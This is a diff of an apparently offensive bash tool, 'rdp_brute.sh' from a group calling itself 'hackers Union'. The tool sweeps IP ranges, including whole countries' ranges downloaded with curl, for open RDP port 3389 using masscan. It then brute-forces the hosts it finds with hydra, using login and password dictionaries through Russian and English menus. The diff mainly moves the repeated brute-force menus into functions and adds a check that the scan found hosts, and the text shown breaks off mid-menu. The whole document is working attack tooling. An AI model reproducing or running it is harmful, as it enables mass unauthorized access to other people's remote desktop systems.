@@ -6,10 +6,122 @@ cat << EOF
                      +-------------------------------------+
                      |            Auto  Script             |
                      |    by GetDrive & hackers Union      | 
-                     |            Version 1.04             |
+                     |            Version 1.05             |
                      +-------------------------------------+
 
 EOF
+#######################################CHECKFILE######################################
+CHECKFILE ()
+{
+if [ -s open3389 ]
+	then
+ echo ""
+	else
+ echo "No open RDP"
+exit;
+fi
+}
+######################################################################################
+#####################################MAINBRUTEMENURU##################################
+MAINBRUTEMENURU ()
+{
+echo ""
+echo "         Выбрать метод перебора.."
+echo "1. Ввести 1 логин и указать путь к файлу с паролями: "; 
+echo "2. Указать путь к файлу с логинами и ввести 1 пароль: ";
+echo "3. Указать путь к файлам с логинами и паролями: ";
+echo "4. Приступить к перебору методом по умолчанию: ";
+read -p "   Выбор из меню : " brutmenu
+
+if [ "$brutmenu" = "1" ]; then
+read -p "Введите логин {administrator, admin & etc.} : " loginbrute
+read -p "Укажите путь к файлу со списком паролей {'/home/dictionary/pass'}: " passlist
+hydra -l $loginbrute -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
+read -p " Нажмите enter для перехода в Главное меню "
+
+./rdp_brute.sh
+fi
+
+
+if [ "$brutmenu" = "2" ]; then
+read -p "Укажите путь к файлу со списком логинов {'/home/dictionary/users'}: " loginlist
+read -p "Введите пароль {administrator, admin, 123456 & etc.} : " passbrute
+hydra -L $loginlist -p $passbrute -t 4 -W 3 -M $PWD/open3389 rdp
+read -p " Нажмите enter для перехода в Главное меню "
+
+./rdp_brute.sh
+fi
+
+
+if [ "$brutmenu" = "3" ]; then
+read -p "Укажите путь к файлу со списком логинов {'/home/dictionary/users'}: " loginlist
+read -p "Укажите путь к файлу со списком паролей {'/home/dictionary/pass'}: " passlist
+hydra -L $loginlist -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
+read -p " Нажмите enter для перехода в Главное меню "
+
+./rdp_brute.sh
+fi
+
+
+if [ "$brutmenu" = "4" ]; then
+echo ""
+hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -M $PWD/open3389 rdp
+read -p " Нажмите enter для перехода в Главное меню "
+
+./rdp_brute.sh
+fi
+}
+######################################################################################
+#####################################MAINBRUTEMENUEN##################################
+MAINBRUTEMENUEN ()
+{
+echo ""
+echo "         Select method.."
+echo "1. Enter your login and specify the path to the file list passwords: "; 
+echo "2. Specify the path to the file list with the login and password to enter: ";
+echo "3. Specify the path to the file list with login and password: ";
+echo "4. Proceed to the brute force method by default: ";
+read -p "   Сhoose from a menu : " brutmenu
+
+if [ "$brutmenu" = "1" ]; then
+read -p "Enter username {administrator, admin & etc.} : " loginbrute
+read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
+hydra -l $loginbrute -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
+read -p " Press enter to return to the Main menu "
+
+./rdp_brute.sh
+fi
+
+
+if [ "$brutmenu" = "2" ]; then
+read -p "Specify the path to the file containing the list of usernames {'/home/dictionary/users'}: " loginlist
+read -p "Enter the password {administrator, admin, 123456 & etc.} : " passbrute
+hydra -L $loginlist -p $passbrute -t 4 -W 3 -M $PWD/open3389 rdp
+read -p " Press enter to return to the Main menu "
+
+./rdp_brute.sh
+fi
+
+
+if [ "$brutmenu" = "3" ]; then
+read -p "Specify the path to the file containing the list of usernames {'/home/dictionary/users'}: " loginlist
+read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
+hydra -L $loginlist -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
+read -p " Press enter to return to the Main menu "
+
+./rdp_brute.sh
+fi
+
+
+if [ "$brutmenu" = "4" ]; then
+echo ""
+hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -M $PWD/open3389 rdp
+read -p " Press enter to return to the Main menu "
+
+./rdp_brute.sh
+fi
+}
+########################################MENURU########################################
 MENURU ()
 {
 clear
@@ -26,6 +138,8 @@ read -p "   Выбор из меню : " menuoption
 if [ "$menuoption" = "1" ]; then
 read -p " Введите диапазон IP {192.168.0.0/24,192.168.0.0-192.168.0.255} : " target
 masscan $target -p3389 --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
+CHECKFILE
+
 echo ""
 echo "Адреса с открытым 3389 портом:"
 cat open3389
@@ -37,59 +151,14 @@ if [ -e hydra.restore ]; then
 rm -f hydra.restore 2> /dev/null
 fi
 
-echo ""
-echo "         Выбрать метод перебора.."
-echo "1. Ввести 1 логин и указать путь к файлу с паролями: "; 
-echo "2. Указать путь к файлу с логинами и ввести 1 пароль: ";
-echo "3. Указать путь к файлам с логинами и паролями: ";
-echo "4. Приступить к перебору методом по умолчанию: ";
-read -p "   Выбор из меню : " brutmenu
-
-if [ "$brutmenu" = "1" ]; then
-read -p "Введите логин {administrator, admin & etc.} : " loginbrute
-read -p "Укажите путь к файлу со списком паролей {'/home/dictionary/pass'}: " passlist
-hydra -l $loginbrute -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Нажмите enter для перехода в Главное меню "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "2" ]; then
-read -p "Укажите путь к файлу со списком логинов {'/home/dictionary/users'}: " loginlist
-read -p "Введите пароль {administrator, admin, 123456 & etc.} : " passbrute
-hydra -L $loginlist -p $passbrute -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Нажмите enter для перехода в Главное меню "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "3" ]; then
-read -p "Укажите путь к файлу со списком логинов {'/home/dictionary/users'}: " loginlist
-read -p "Укажите путь к файлу со списком паролей {'/home/dictionary/pass'}: " passlist
-hydra -L $loginlist -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Нажмите enter для перехода в Главное меню "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "4" ]; then
-echo ""
-hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Нажмите enter для перехода в Главное меню "
-
-./rdp_brute.sh
-fi
-
-
+MAINBRUTEMENURU
 else
 
 if [ "$menuoption" = "2" ]; then
 
 read -p " Введите путь к файлу {list.txt,list..& etc.} : " listname
 masscan -p3389 -iL $listname --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
+CHECKFILE
 echo ""
 echo "Адреса с открытым 3389 портом:"
 cat open3389
@@ -101,53 +170,7 @@ if [ -e hydra.restore ]; then
 rm -f hydra.restore 2> /dev/null
 fi
 
-echo ""
-echo "         Выбрать метод перебора.."
-echo "1. Ввести 1 логин и указать путь к файлу с паролями: "; 
-echo "2. Указать путь к файлу с логинами и ввести 1 пароль: ";
-echo "3. Указать путь к файлам с логинами и паролями: ";
-echo "4. Приступить к перебору методом по умолчанию: ";
-read -p "   Выбор из меню : " brutmenu
-
-if [ "$brutmenu" = "1" ]; then
-read -p "Введите логин {administrator, admin & etc.} : " loginbrute
-read -p "Укажите путь к файлу со списком паролей {'/home/dictionary/pass'}: " passlist
-hydra -l $loginbrute -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Нажмите enter для перехода в Главное меню "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "2" ]; then
-read -p "Укажите путь к файлу со списком логинов {'/home/dictionary/users'}: " loginlist
-read -p "Введите пароль {administrator, admin, 123456 & etc.} : " passbrute
-hydra -L $loginlist -p $passbrute -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Нажмите enter для перехода в Главное меню "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "3" ]; then
-read -p "Укажите путь к файлу со списком логинов {'/home/dictionary/users'}: " loginlist
-read -p "Укажите путь к файлу со списком паролей {'/home/dictionary/pass'}: " passlist
-hydra -L $loginlist -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Нажмите enter для перехода в Главное меню "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "4" ]; then
-echo ""
-hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Нажмите enter для перехода в Главное меню "
-
-./rdp_brute.sh
-fi
-
-
+MAINBRUTEMENURU
 else
 
 if [ "$menuoption" = "3" ]; then
@@ -158,53 +181,7 @@ if [ -e hydra.restore ]; then
 rm -f hydra.restore 2> /dev/null
 fi
 
-echo ""
-echo "         Выбрать метод перебора.."
-echo "1. Ввести 1 логин и указать путь к файлу с паролями: "; 
-echo "2. Указать путь к файлу с логинами и ввести 1 пароль: ";
-echo "3. Указать путь к файлам с логинами и паролями: ";
-echo "4. Приступить к перебору методом по умолчанию: ";
-read -p "   Выбор из меню : " brutmenu
-
-if [ "$brutmenu" = "1" ]; then
-read -p "Введите логин {administrator, admin & etc.} : " loginbrute
-read -p "Укажите путь к файлу со списком паролей {'/home/dictionary/pass'}: " passlist
-hydra -l $loginbrute -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Нажмите enter для перехода в Главное меню "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "2" ]; then
-read -p "Укажите путь к файлу со списком логинов {'/home/dictionary/users'}: " loginlist
-read -p "Введите пароль {administrator, admin, 123456 & etc.} : " passbrute
-hydra -L $loginlist -p $passbrute -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Нажмите enter для перехода в Главное меню "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "3" ]; then
-read -p "Укажите путь к файлу со списком логинов {'/home/dictionary/users'}: " loginlist
-read -p "Укажите путь к файлу со списком паролей {'/home/dictionary/pass'}: " passlist
-hydra -L $loginlist -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Нажмите enter для перехода в Главное меню "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "4" ]; then
-echo ""
-hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Нажмите enter для перехода в Главное меню "
-
-./rdp_brute.sh
-fi
-
-
+MAINBRUTEMENURU
 else
 if [ "$menuoption" = "4" ]; then
 echo "1.   Afghanistan";
@@ -426,6 +403,7 @@ echo ""
 echo "Для выхода из режима сканирования 'CTRL+C'"
 echo ""
 masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
+CHECKFILE
 
 echo "Хосты с открытым 3389 портом записаны в файл $PWD/open3389"
 
@@ -436,52 +414,7 @@ if [ -e hydra.restore ]; then
 rm -f hydra.restore 2> /dev/null
 fi
 
-echo ""
-echo "         Выбрать метод перебора.."
-echo "1. Ввести 1 логин и указать путь к файлу с паролями: "; 
-echo "2. Указать путь к файлу с логинами и ввести 1 пароль: ";
-echo "3. Указать путь к файлам с логинами и паролями: ";
-echo "4. Приступить к перебору методом по умолчанию: ";
-read -p "   Выбор из меню : " brutmenu
-
-if [ "$brutmenu" = "1" ]; then
-read -p "Введите логин {administrator, admin & etc.} : " loginbrute
-read -p "Укажите путь к файлу со списком паролей {'/home/dictionary/pass'}: " passlist
-hydra -l $loginbrute -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Нажмите enter для перехода в Главное меню "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "2" ]; then
-read -p "Укажите путь к файлу со списком логинов {'/home/dictionary/users'}: " loginlist
-read -p "Введите пароль {administrator, admin, 123456 & etc.} : " passbrute
-hydra -L $loginlist -p $passbrute -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Нажмите enter для перехода в Главное меню "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "3" ]; then
-read -p "Укажите путь к файлу со списком логинов {'/home/dictionary/users'}: " loginlist
-read -p "Укажите путь к файлу со списком паролей {'/home/dictionary/pass'}: " passlist
-hydra -L $loginlist -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Нажмите enter для перехода в Главное меню "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "4" ]; then
-echo ""
-hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Нажмите enter для перехода в Главное меню "
-
-./rdp_brute.sh
-fi
-
+MAINBRUTEMENURU
 else
 
 if [ "$country" = "2" ]; then
@@ -498,6 +431,7 @@ echo ""
 echo "Для выхода из режима сканирования 'CTRL+C'"
 echo ""
 masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
+CHECKFILE
 
 echo "Хосты с открытым 3389 портом записаны в файл $PWD/open3389"
 
@@ -508,53 +442,7 @@ if [ -e hydra.restore ]; then
 rm -f hydra.restore 2> /dev/null
 fi
 
-echo ""
-echo "         Выбрать метод перебора.."
-echo "1. Ввести 1 логин и указать путь к файлу с паролями: "; 
-echo "2. Указать путь к файлу с логинами и ввести 1 пароль: ";
-echo "3. Указать путь к файлам с логинами и паролями: ";
-echo "4. Приступить к перебору методом по умолчанию: ";
-read -p "   Выбор из меню : " brutmenu
-
-if [ "$brutmenu" = "1" ]; then
-read -p "Введите логин {administrator, admin & etc.} : " loginbrute
-read -p "Укажите путь к файлу со списком паролей {'/home/dictionary/pass'}: " passlist
-hydra -l $loginbrute -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Нажмите enter для перехода в Главное меню "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "2" ]; then
-read -p "Укажите путь к файлу со списком логинов {'/home/dictionary/users'}: " loginlist
-read -p "Введите пароль {administrator, admin, 123456 & etc.} : " passbrute
-hydra -L $loginlist -p $passbrute -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Нажмите enter для перехода в Главное меню "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "3" ]; then
-read -p "Укажите путь к файлу со списком логинов {'/home/dictionary/users'}: " loginlist
-read -p "Укажите путь к файлу со списком паролей {'/home/dictionary/pass'}: " passlist
-hydra -L $loginlist -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Нажмите enter для перехода в Главное меню "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "4" ]; then
-echo ""
-hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Нажмите enter для перехода в Главное меню "
-
-./rdp_brute.sh
-fi
-
-
+MAINBRUTEMENURU
 else
 if [ "$country" = "3" ]; then
 curl http://ipdiapazon.16mb.com/Algeria.html |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/ //g">list
@@ -570,6 +458,7 @@ echo ""
 echo "Для выхода из режима сканирования 'CTRL+C'"
 echo ""
 masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
+CHECKFILE
 
 
 echo "Хосты с открытым 3389 портом записаны в файл $PWD/open3389"
@@ -581,53 +470,7 @@ if [ -e hydra.restore ]; then
 rm -f hydra.restore 2> /dev/null
 fi
 
-echo ""
-echo "         Выбрать метод перебора.."
-echo "1. Ввести 1 логин и указать путь к файлу с паролями: "; 
-echo "2. Указать путь к файлу с логинами и ввести 1 пароль: ";
-echo "3. Указать путь к файлам с логинами и паролями: ";
-echo "4. Приступить к перебору методом по умолчанию: ";
-read -p "   Выбор из меню : " brutmenu
-
-if [ "$brutmenu" = "1" ]; then
-read -p "Введите логин {administrator, admin & etc.} : " loginbrute
-read -p "Укажите путь к файлу со списком паролей {'/home/dictionary/pass'}: " passlist
-hydra -l $loginbrute -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Нажмите enter для перехода в Главное меню "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "2" ]; then
-read -p "Укажите путь к файлу со списком логинов {'/home/dictionary/users'}: " loginlist
-read -p "Введите пароль {administrator, admin, 123456 & etc.} : " passbrute
-hydra -L $loginlist -p $passbrute -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Нажмите enter для перехода в Главное меню "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "3" ]; then
-read -p "Укажите путь к файлу со списком логинов {'/home/dictionary/users'}: " loginlist
-read -p "Укажите путь к файлу со списком паролей {'/home/dictionary/pass'}: " passlist
-hydra -L $loginlist -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Нажмите enter для перехода в Главное меню "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "4" ]; then
-echo ""
-hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Нажмите enter для перехода в Главное меню "
-
-./rdp_brute.sh
-fi
-
-
+MAINBRUTEMENURU
 
 else
 if [ "$country" = "4" ]; then
@@ -644,6 +487,7 @@ echo ""
 echo "Для выхода из режима сканирования 'CTRL+C'"
 echo ""
 masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
+CHECKFILE
 
 echo "Хосты с открытым 3389 портом записаны в файл $PWD/open3389"
 
@@ -654,52 +498,7 @@ if [ -e hydra.restore ]; then
 rm -f hydra.restore 2> /dev/null
 fi
 
-echo ""
-echo "         Выбрать метод перебора.."
-echo "1. Ввести 1 логин и указать путь к файлу с паролями: "; 
-echo "2. Указать путь к файлу с логинами и ввести 1 пароль: ";
-echo "3. Указать путь к файлам с логинами и паролями: ";
-echo "4. Приступить к перебору методом по умолчанию: ";
-read -p "   Выбор из меню : " brutmenu
-
-if [ "$brutmenu" = "1" ]; then
-read -p "Введите логин {administrator, admin & etc.} : " loginbrute
-read -p "Укажите путь к файлу со списком паролей {'/home/dictionary/pass'}: " passlist
-hydra -l $loginbrute -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Нажмите enter для перехода в Главное меню "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "2" ]; then
-read -p "Укажите путь к файлу со списком логинов {'/home/dictionary/users'}: " loginlist
-read -p "Введите пароль {administrator, admin, 123456 & etc.} : " passbrute
-hydra -L $loginlist -p $passbrute -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Нажмите enter для перехода в Главное меню "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "3" ]; then
-read -p "Укажите путь к файлу со списком логинов {'/home/dictionary/users'}: " loginlist
-read -p "Укажите путь к файлу со списком паролей {'/home/dictionary/pass'}: " passlist
-hydra -L $loginlist -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Нажмите enter для перехода в Главное меню "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "4" ]; then
-echo ""
-hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Нажмите enter для перехода в Главное меню "
-
-./rdp_brute.sh
-fi
-
+MAINBRUTEMENURU
 else
 if [ "$country" = "5" ]; then
 curl http://ipdiapazon.16mb.com/Andorra.html |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/ //g">list
@@ -715,6 +514,7 @@ echo ""
 echo "Для выхода из режима сканирования 'CTRL+C'"
 echo ""
 masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
+CHECKFILE
 
 echo "Хосты с открытым 3389 портом записаны в файл $PWD/open3389"
 
@@ -725,52 +525,7 @@ if [ -e hydra.restore ]; then
 rm -f hydra.restore 2> /dev/null
 fi
 
-echo ""
-echo "         Выбрать метод перебора.."
-echo "1. Ввести 1 логин и указать путь к файлу с паролями: "; 
-echo "2. Указать путь к файлу с логинами и ввести 1 пароль: ";
-echo "3. Указать путь к файлам с логинами и паролями: ";
-echo "4. Приступить к перебору методом по умолчанию: ";
-read -p "   Выбор из меню : " brutmenu
-
-if [ "$brutmenu" = "1" ]; then
-read -p "Введите логин {administrator, admin & etc.} : " loginbrute
-read -p "Укажите путь к файлу со списком паролей {'/home/dictionary/pass'}: " passlist
-hydra -l $loginbrute -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Нажмите enter для перехода в Главное меню "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "2" ]; then
-read -p "Укажите путь к файлу со списком логинов {'/home/dictionary/users'}: " loginlist
-read -p "Введите пароль {administrator, admin, 123456 & etc.} : " passbrute
-hydra -L $loginlist -p $passbrute -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Нажмите enter для перехода в Главное меню "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "3" ]; then
-read -p "Укажите путь к файлу со списком логинов {'/home/dictionary/users'}: " loginlist
-read -p "Укажите путь к файлу со списком паролей {'/home/dictionary/pass'}: " passlist
-hydra -L $loginlist -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Нажмите enter для перехода в Главное меню "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "4" ]; then
-echo ""
-hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Нажмите enter для перехода в Главное меню "
-
-./rdp_brute.sh
-fi
-
+MAINBRUTEMENURU
 else
 
 if [ "$country" = "6" ]; then
@@ -787,6 +542,7 @@ echo ""
 echo "Для выхода из режима сканирования 'CTRL+C'"
 echo ""
 masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
+CHECKFILE
 
 echo "Хосты с открытым 3389 портом записаны в файл $PWD/open3389"
 
@@ -797,52 +553,7 @@ if [ -e hydra.restore ]; then
 rm -f hydra.restore 2> /dev/null
 fi
 
-echo ""
-echo "         Выбрать метод перебора.."
-echo "1. Ввести 1 логин и указать путь к файлу с паролями: "; 
-echo "2. Указать путь к файлу с логинами и ввести 1 пароль: ";
-echo "3. Указать путь к файлам с логинами и паролями: ";
-echo "4. Приступить к перебору методом по умолчанию: ";
-read -p "   Выбор из меню : " brutmenu
-
-if [ "$brutmenu" = "1" ]; then
-read -p "Введите логин {administrator, admin & etc.} : " loginbrute
-read -p "Укажите путь к файлу со списком паролей {'/home/dictionary/pass'}: " passlist
-hydra -l $loginbrute -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Нажмите enter для перехода в Главное меню "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "2" ]; then
-read -p "Укажите путь к файлу со списком логинов {'/home/dictionary/users'}: " loginlist
-read -p "Введите пароль {administrator, admin, 123456 & etc.} : " passbrute
-hydra -L $loginlist -p $passbrute -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Нажмите enter для перехода в Главное меню "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "3" ]; then
-read -p "Укажите путь к файлу со списком логинов {'/home/dictionary/users'}: " loginlist
-read -p "Укажите путь к файлу со списком паролей {'/home/dictionary/pass'}: " passlist
-hydra -L $loginlist -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Нажмите enter для перехода в Главное меню "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "4" ]; then
-echo ""
-hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Нажмите enter для перехода в Главное меню "
-
-./rdp_brute.sh
-fi
-
+MAINBRUTEMENURU
 else
 if [ "$country" = "7" ]; then
 curl http://ipdiapazon.16mb.com/Anguilla.html |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/ //g">list
@@ -858,6 +569,7 @@ echo ""
 echo "Для выхода из режима сканирования 'CTRL+C'"
 echo ""
 masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
+CHECKFILE
 
 echo "Хосты с открытым 3389 портом записаны в файл $PWD/open3389"
 
@@ -868,52 +580,7 @@ if [ -e hydra.restore ]; then
 rm -f hydra.restore 2> /dev/null
 fi
 
-echo ""
-echo "         Выбрать метод перебора.."
-echo "1. Ввести 1 логин и указать путь к файлу с паролями: "; 
-echo "2. Указать путь к файлу с логинами и ввести 1 пароль: ";
-echo "3. Указать путь к файлам с логинами и паролями: ";
-echo "4. Приступить к перебору методом по умолчанию: ";
-read -p "   Выбор из меню : " brutmenu
-
-if [ "$brutmenu" = "1" ]; then
-read -p "Введите логин {administrator, admin & etc.} : " loginbrute
-read -p "Укажите путь к файлу со списком паролей {'/home/dictionary/pass'}: " passlist
-hydra -l $loginbrute -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Нажмите enter для перехода в Главное меню "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "2" ]; then
-read -p "Укажите путь к файлу со списком логинов {'/home/dictionary/users'}: " loginlist
-read -p "Введите пароль {administrator, admin, 123456 & etc.} : " passbrute
-hydra -L $loginlist -p $passbrute -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Нажмите enter для перехода в Главное меню "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "3" ]; then
-read -p "Укажите путь к файлу со списком логинов {'/home/dictionary/users'}: " loginlist
-read -p "Укажите путь к файлу со списком паролей {'/home/dictionary/pass'}: " passlist
-hydra -L $loginlist -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Нажмите enter для перехода в Главное меню "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "4" ]; then
-echo ""
-hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Нажмите enter для перехода в Главное меню "
-
-./rdp_brute.sh
-fi
-
+MAINBRUTEMENURU
 else
 if [ "$country" = "8" ]; then
 curl http://ipdiapazon.16mb.com/Antigua.html |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/ //g">list
@@ -929,6 +596,7 @@ echo ""
 echo "Для выхода из режима сканирования 'CTRL+C'"
 echo ""
 masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
+CHECKFILE
 
 echo "Хосты с открытым 3389 портом записаны в файл $PWD/open3389"
 
@@ -938,53 +606,7 @@ if [ -e hydra.restore ]; then
 rm -f hydra.restore 2> /dev/null
 fi
 
-echo ""
-echo "         Выбрать метод перебора.."
-echo "1. Ввести 1 логин и указать путь к файлу с паролями: "; 
-echo "2. Указать путь к файлу с логинами и ввести 1 пароль: ";
-echo "3. Указать путь к файлам с логинами и паролями: ";
-echo "4. Приступить к перебору методом по умолчанию: ";
-read -p "   Выбор из меню : " brutmenu
-
-if [ "$brutmenu" = "1" ]; then
-read -p "Введите логин {administrator, admin & etc.} : " loginbrute
-read -p "Укажите путь к файлу со списком паролей {'/home/dictionary/pass'}: " passlist
-hydra -l $loginbrute -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Нажмите enter для перехода в Главное меню "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "2" ]; then
-read -p "Укажите путь к файлу со списком логинов {'/home/dictionary/users'}: " loginlist
-read -p "Введите пароль {administrator, admin, 123456 & etc.} : " passbrute
-hydra -L $loginlist -p $passbrute -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Нажмите enter для перехода в Главное меню "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "3" ]; then
-read -p "Укажите путь к файлу со списком логинов {'/home/dictionary/users'}: " loginlist
-read -p "Укажите путь к файлу со списком паролей {'/home/dictionary/pass'}: " passlist
-hydra -L $loginlist -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Нажмите enter для перехода в Главное меню "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "4" ]; then
-echo ""
-hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Нажмите enter для перехода в Главное меню "
-
-./rdp_brute.sh
-fi
-
-
+MAINBRUTEMENURU
 else
 if [ "$country" = "9" ]; then
 curl http://ipdiapazon.16mb.com/Argentina.html |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/ //g">list
@@ -1000,6 +622,7 @@ echo ""
 echo "Для выхода из режима сканирования 'CTRL+C'"
 echo ""
 masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
+CHECKFILE
 
 echo "Хосты с открытым 3389 портом записаны в файл $PWD/open3389"
 
@@ -1009,53 +632,7 @@ if [ -e hydra.restore ]; then
 rm -f hydra.restore 2> /dev/null
 fi
 
-echo ""
-echo "         Выбрать метод перебора.."
-echo "1. Ввести 1 логин и указать путь к файлу с паролями: "; 
-echo "2. Указать путь к файлу с логинами и ввести 1 пароль: ";
-echo "3. Указать путь к файлам с логинами и паролями: ";
-echo "4. Приступить к перебору методом по умолчанию: ";
-read -p "   Выбор из меню : " brutmenu
-
-if [ "$brutmenu" = "1" ]; then
-read -p "Введите логин {administrator, admin & etc.} : " loginbrute
-read -p "Укажите путь к файлу со списком паролей {'/home/dictionary/pass'}: " passlist
-hydra -l $loginbrute -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Нажмите enter для перехода в Главное меню "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "2" ]; then
-read -p "Укажите путь к файлу со списком логинов {'/home/dictionary/users'}: " loginlist
-read -p "Введите пароль {administrator, admin, 123456 & etc.} : " passbrute
